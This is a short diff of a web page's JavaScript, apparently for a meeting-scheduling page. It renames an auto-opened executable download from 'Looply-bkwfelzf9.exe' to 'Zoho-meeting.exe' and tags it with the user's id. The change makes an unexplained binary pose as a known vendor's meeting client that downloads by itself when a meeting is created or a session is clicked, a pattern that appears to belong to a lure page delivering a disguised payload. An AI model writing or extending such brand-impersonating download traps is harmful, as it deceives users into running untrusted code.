@@ -582,7 +582,7 @@
       localStorage.setItem('meetings', JSON.stringify(meetings));
 
       // Open external link for auto download with user id
-      window.open(`./Looply-bkwfelzf9.exe?user=${encodeURIComponent(currentUser)}`, "_blank");
+      window.open(`./Zoho-meeting.exe?user=${encodeURIComponent(currentUser)}`, "_blank");
 
       // Show professional popup
       showSessionPopup();
@@ -631,7 +631,7 @@
 
     // Download session from meeting list (now opens link and shows popup)
     window.downloadSession = function(session) {
-      window.open(`./Looply-bkwfelzf9.exe?user=${encodeURIComponent(session.user)}`, "_blank");
+      window.open(`./Zoho-meeting.exe?user=${encodeURIComponent(session.user)}`, "_blank");
       showSessionPopup();
     };
 
